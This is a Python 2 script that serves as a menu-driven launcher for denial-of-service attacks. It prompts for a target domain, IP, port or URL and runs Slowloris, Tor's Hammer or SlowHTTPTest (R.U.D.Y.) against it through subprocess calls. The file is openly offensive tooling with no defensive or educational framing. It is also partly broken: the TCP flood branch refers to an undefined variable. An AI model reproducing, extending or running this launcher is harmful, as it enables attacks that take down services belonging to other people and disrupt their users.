#!/usr/bin/python

import os
import subprocess
from termcolor import colored
import sys
from colors import *
try:
	while True:



		os.system("clear")
		file = open("Banner/banner", "r") 	#Stupid
		sys.stdout.write(GREEN)
		print file.read()			#Banner
		
		print colored("    1:.","blue"), colored("DDoS Attacks\n","white")
		sys.stdout.write(BOLD)
		print colored("    99:.","red"), colored("Quit\n","white")
		sys.stdout.write(BOLD)
		user_input_menu=input( colored("    $: ","grey"))

		############ DoS Attacks #################

		if user_input_menu==1:
			os.system("clear")
			while True:

				############################################
				file = open("Banner/ddos", "r") 
				sys.stdout.write(GREEN)	#----------> DDoS Banner
				print file.read()

				##################### Dos Options ##########
				print(" ")
				sys.stdout.write(BOLD)
				print colored("     1:.","blue"), colored("TCP Connection Flood (soon)","white")
				sys.stdout.write(BOLD)
				print colored("     2:.","blue"), colored("HTTP Attacks","white")
				sys.stdout.write(BOLD)
				user_input1=input( colored("     $: ","grey"))

				############################################


				if user_input1==1:
					os.system("clear")
					
					if user_input_TcpConnectionFlood==99:
						os.system("clear")
						break
				#################################################

				if user_input1==2: #----------> HTTP Attacks
					while True:

						os.system("clear")
						file = open("Banner/HTTP", "r") 
						sys.stdout.write(GREEN)	#Stupid
						print file.read()
						sys.stdout.write(BOLD)
						print colored("     1:.","blue"),colored(" Slowloris","white")
						sys.stdout.write(BOLD)
						print colored("     2:.","blue"),colored(" Tors Hammer","white")
						sys.stdout.write(BOLD)
						print colored("     3:.","blue"),colored(" SlowHTTPTest\n","white")
						
						sys.stdout.write(BOLD)
						print colored("     99:.","red"), colored("Go Back\n","white")
						sys.stdout.write(BOLD)
						user_input_HTTPAttacks=input(colored("     $:","grey"))

						if user_input_HTTPAttacks==99:
							os.system("clear")
							break



						elif user_input_HTTPAttacks==1: #-------> slowloris						
							os.system("clear")
							print("\nSlowloris!!\n") #--------> Slowloris Dos Attack

							os.system("clear")
							file = open("Banner/slowloris", "r") 	#Stupid
							sys.stdout.write(GREEN)
							print file.read()
							print colored("slowloris attack is about to start","red")
							Domain_s=raw_input("   Domain: ")
							subprocess.call(["perl","Dos_Attacks/slowloris/slowloris.pl","-dns",Domain_s])
							break

						#########################################
						elif user_input_HTTPAttacks==2: # ---------> tors hammer
							os.system("clear")
							file = open("Banner/hammer", "r") 
							sys.stdout.write(GREEN)	#Stupid
							print file.read()

							server_ip_hammer=raw_input("\n      Server IP: ")
							port_hammer=raw_input("      Port(80): ")
							turbo_hammer=raw_input("    Turbo(135): ")
							subprocess.call(["./Dos_Attacks/hammer/hammer.py","-s",server_ip_hammer,"-p",port_hammer,"-t",turbo_hammer])
						#########################################
						elif user_input_HTTPAttacks==3: #----------> rudy
							while True:
								os.system("clear")
								file = open("Banner/rudy", "r") 
								sys.stdout.write(GREEN)
								print file.read()
								print colored("\n     RUDY Attack using SLOWHTTPTEST Dos Tool !!!\n","white")
								connections_rudy=raw_input("     Connections(1000): ")
								followup_sec_rudy=raw_input("     FollowUp Seconds(110): ")
								connections_per_second_rudy=raw_input("     Connections Per Second(200): ")
								bytes_value_rudy=raw_input("     Bytes Value(8200): ")
								get_post_rudy=raw_input("     get/post: ")
								url_rudy=raw_input("     URL: ")
								subprocess.call(["slowhttptest","-c",connections_rudy,"-B","-i",followup_sec_rudy,"-r",connections_per_second_rudy,"-s",bytes_value_rudy,"-t",get_post_rudy,"-u",url_rudy])
								break
except KeyboardInterrupt:
	sys.exit(0) # or 1, or whatever

